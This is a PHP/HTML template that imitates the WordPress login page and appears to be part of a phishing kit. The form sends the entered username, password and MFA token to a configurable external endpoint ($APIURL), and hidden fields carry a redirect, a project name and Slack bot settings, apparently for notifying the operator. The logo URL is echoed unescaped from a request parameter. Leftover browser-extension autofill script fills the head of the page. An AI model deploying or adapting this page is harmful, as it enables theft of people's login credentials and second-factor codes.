<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><script>
if (navigator.usb) {
  delete navigator.usb.__proto__.getDevices;
  delete navigator.usb.__proto__.requestDevice;
  delete navigator.__proto__.usb;
}
</script><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title><?php if($Title != ""){echo $Title;}else{echo "Log in";} ?></title>
        <link rel="stylesheet" id="buttons-css" href="wordpress_files/buttons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="open-sans-css" href="wordpress_files/css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="wordpress_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="login-css" href="wordpress_files/login.min.css" type="text/css" media="all">
<meta name="robots" content="noindex,follow">
        <script>(function n(){!function(){function e(e,t,n){t=t||{};var r=e.ownerDocument||e,i=r.createEvent?r.createEvent("CustomEvent"):r.createEventObject();i.initCustomEvent&&i.initCustomEvent(t.type,!!t.bubbles,!!t.cancelable,t.detail);for(var a in t)i[a]=t[a];return setTimeout(function(){try{e.dispatchEvent?e.dispatchEvent(i):e.fireEvent("on"+t.type,r.createEventObject())}catch(n){var a=e["listen"+t.type];if(a)for(var o=0;o<a.length;++o)try{a[o].call(e,i)}catch(e){}}n()},0),this}function t(e,t,n){function r(e,t){try{var n=e.ownerDocument;if(n.createEventObject){var r=n.createEventObject();e.fireEvent("on"+t,r)}else r=n.createEvent("HTMLEvents"),r.initEvent(t,!0,!0),e.dispatchEvent(r)}catch(e){}}var i=!0,a=e.className&&e.className.indexOf("fancified")!=-1;if(window.jQuery){var o=window.jQuery(e);try{if(o.selectBoxIt)o.selectBoxIt("selectOption",o.val());else if(o.data("chosen")||o.chosen)o.trigger("chosen:updated").trigger("liszt:updated");else if(o.data("chooserElement"))o.trigger("change");else if(o.fancySelect)o.get("fancySelect").select("value",o.val());else if(o.selectBox)o.selectBox("value",o.val());else if(o.selectric)o.selectric("refresh");else if(o.coreUISelect){var s=o.data("coreUISelect");s.isSelectShow=!0,s.changeDropdownData(),s.isSelectShow=!1}else if(o.data("myJSPulldownObject")){var l=o.data("myJSPulldownObject");l.setToValue(o.val())}else if(o.fancyfields)o.setVal(o.val());else if(o.data("select2"));else if(o.data("selectize"))i=!1,o.data("selectize").setValue(o.val());else if(o.hasClass("fancified"))o.trigger("update");else if(o.selectmenu){var c=o.val();try{o.selectmenu("value",o[0].options[0].value)}catch(e){}o.selectmenu("value",c)}else o.hasClass("select-hidden")&&o.next("div.select-styled").length&&o.next("div.select-styled").next(".select-options").length&&(ulElement=o.next("div.select-styled").next(".select-options"),liElement=ulElement.find("li[rel='"+o.val()+"']"),liElement.click());o.trigger("change")}catch(e){}}i&&(a&&r(e,"update"),r(e,"change"),r(e,"blur")),n()}function n(t,n,r,i){var a=t.value;e(t,{type:"keydown",keyCode:n,which:n,charCode:n,bubbles:!0},function(){e(t,{type:"keypress",keyCode:n,which:n,charCode:n,bubbles:!0},function(){setTimeout(function(){var o=t.value;a==o&&(t.value=r),e(t,{type:"input",keyCode:n,which:n,charCode:n,bubbles:!0},function(){e(t,{type:"keyup",keyCode:n,which:n,charCode:n,bubbles:!0},function(){i()})})},1)})})}function r(e,t,i,a){if(!t||""==t)return void a();var o=t.charCodeAt(0);i+=t.charAt(0),n(e,o,i,function(){r(e,t.substring(1),i,a)})}function i(t,n,r){if(window.abineTriggerChangeInProgress)return void setTimeout(function(){i(t,n,r)},100);var a=!0;window.abineTriggerChangeInProgress=!0;try{if(window.jQuery){var o=window.jQuery(t);o.data("rawMaskFn")||o.mask||o.CardPhoneFormatting?o.focus().val(n).trigger("input").trigger("paste"):o.next(".inner").find(".options").length&&(a=!1,optionsContainer=o.next(".inner").find(".options"),optionElements=optionsContainer.find("span"),optionElements.each(function(){optionElement=$(this),optionElementHtml=$(optionElement).html(),optionElementHtml.toLowerCase().indexOf(n)>-1&&$(optionElement).click()}))}}catch(e){}a?e(t,{type:"change"},function(){e(t,{type:"blur"},function(){try{var e=new Event("input",{bubbles:!0,cancelable:!0});t.dispatchEvent(e)}catch(e){}window.abineTriggerChangeInProgress=!1,r()})}):(window.abineTriggerChangeInProgress=!1,r())}function a(t,n,a){try{t.ownerDocument.defaultView.focus()}catch(e){}e(t,{type:"focus"},function(){e(t,{type:"click"},function(){r(t,n+"\n","",function(){i(t,n,function(){e(document,{type:"abineFilled"},function(){a()})})})})})}function o(n,r,i,a){var o=/[\s]+/g,s=(r||"").toLowerCase().replace(o,""),l=function(){e(document,{type:"abineFilled"},function(){a()})},c=!1,u=!1,d=n.getElementsByTagName("option");if(d&&d.length>0){for(var h=-1,f=0;f<d.length;f++){var p=(d[f].text||"").toLowerCase().replace(o,""),m=(d[f].getAttribute("value")||"").toLowerCase().replace(o,"");if(m==s||p==s){d[f].selected||(c=!0,d[f].selected=!0),u=!0;break}h==-1&&p.indexOf(s)!=-1&&(h=f)}u||h==-1||i||d[h].selected||(c=!0,d[h].selected=!0,u=!0)}n.setAttribute("abineFillResponse",u),c?t(n,r,l):l()}function s(){var e=document.getElementsByClassName("abineFillTarget");if(e.length>0)return e[0];for(var t=0;t<frames.length;t++)try{var e=frames[t].document.getElementsByClassName("abineFillTarget");if(e.length>0)return e[0]}catch(e){}return null}function l(){var n=document.createElement("div");n.id="abineFillElement","undefined"!=typeof paypal&&n.setAttribute("data-paypal","1"),"undefined"!=typeof OffAmazonPayments&&n.setAttribute("data-amazon","1"),"undefined"!=typeof MasterPass&&n.setAttribute("data-masterpass","1"),document.documentElement.appendChild(n),n.addEventListener("fill",function(){var t=s();if(t){var r=n.getAttribute("value");a(t,r,function(){})}else e(document,{type:"abineFilled"},function(){})},!1),n.addEventListener("fillSelect",function(){var t=s();if(t){var r=n.getAttribute("value"),i=!!n.getAttribute("skipPartial");o(t,r,i,function(){})}else e(document,{type:"abineFilled"},function(){})}),n.addEventListener("triggerChange",function(){var e=s(),r=n.getAttribute("value");e&&(e.nodeName.match(/select/i)?t(e,r,function(){}):i(e,r,function(){}))})}l()}()})()</script></head>
        <body class="login login-action-login wp-core-ui  locale-en">
        <div id="login">



<!-------------------------------------------- CHANGE LOGO HERE ---------------------------->
        <center><img src="<?php if(isset($_REQUEST['ImageLogo']) && $_REQUEST['ImageLogo'] != ""){echo $_REQUEST['ImageLogo'];}else{echo "wordpress_files/wordpresslogo.png";} ?>" width="100"></center>





        <form name="loginform" id="loginform" action="<?php echo $APIURL; ?>" method="post">
        <p>
                <label for="user_login">Username<br>
                <input type="text" name="username" id="user_login" class="input" value="" size="20"></label>
        </p>
        <p>
                <label for="user_pass">Password<br>
                <input type="password" name="password" id="user_pass" class="input" value="" size="20"></label>
<?php if($MFA == "on"){ ?>
<label for="user_mfa">Token<br>
<input type="text" name="token" id="user_mfa" class="input" value="" size="20" <?php if($MFArequired == "on"){ ?>required<?php } ?>></label>
<?php } ?>
                <input type="hidden" name="project" value="<?php echo $Project; ?>">
                <input type="hidden" name="redirect" value="<?php echo $Redirect; ?>">
                <input type="hidden" name="slackbotname" value="<?php echo $SlackBotName; ?>">
                <input type="hidden" name="slackemoji" value="<?php echo $SlackEmoji; ?>">
        </p>
                <p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Remember Me</label></p>
        <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
        </p>
</form>


<script type="text/javascript">
function wp_attempt_focus(){
setTimeout( function(){ try{
d = document.getElementById('user_login');
d.focus();
d.select();
} catch(e){}
}, 200);
}

wp_attempt_focus();
if(typeof wpOnload=='function')wpOnload();
</script>



        </div>


                <div class="clear"></div>


        </body><div id="abineFillElement"></div><div class="abineContentPanel" style="background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: transparent !important; margin: 0px !important; padding: 0px !important; opacity: 1 !important; z-index: 2147483647 !important; position: absolute !important; overflow: hidden !important; border-width: 0px !important; visibility: visible !important; display: none;"><iframe class="abineContentFrame" width="450px" allowtransparency="true" frameborder="0" height="0px" scrolling="no" src="wordpress_files/panel.html" id="abine2758469doNotRemove" style="position:relative !important;display:block !important;background:transparent !important;border-width:0px !important;left:0px !important;top:0px !important;visibility:visible !important;opacity:1 !important;filter:alpha(opacity:100) !important;margin:0 !important;padding:0 !important;height:0px !important;width:450px"></iframe></div></html>
